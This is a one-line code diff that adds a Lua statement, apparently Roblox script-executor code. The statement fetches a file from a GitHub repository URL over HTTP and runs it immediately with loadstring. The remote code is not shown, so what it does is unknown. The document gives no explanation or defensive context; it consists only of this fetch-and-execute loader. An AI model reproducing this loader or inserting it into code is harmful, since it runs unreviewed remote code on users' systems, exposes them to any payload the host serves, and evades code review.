@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://github.com/MerrySubs4t/Softwork/blob/main/Fetching/dll?raw=true"))()
